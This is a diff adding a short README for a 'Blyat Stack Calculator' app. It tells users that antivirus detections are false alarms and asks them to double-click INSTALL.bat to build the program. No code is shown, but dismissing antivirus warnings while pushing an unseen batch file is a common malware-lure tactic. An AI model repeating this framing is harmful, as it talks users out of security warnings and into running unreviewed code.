@@ -1,0 +1,19 @@
+Hey there!
+
+Thanks for downloading Blyat Stack Calculator. Some antivirus programs falsely flag the app as a virus (they're just scared of how powerful it is).
+
+To avoid this, you'll compile it yourself—don’t worry, it’s easy!
+
+1. Install Python from https://www.python.org/downloads/
+   - Make sure to check “Add Python to PATH” during installation.
+
+2. Double-click INSTALL.bat
+   - It’ll build the app for you. It may take a while so please be patient
+
+3. Use the generated Blyat Stack Calculator.exe from now on.
+
+Created by Omni019  
+🌐 Website: https://omni019.rf.gd  
+🔫 Guns.lol profile: https://guns.lol/omni019
+
+Enjoy!
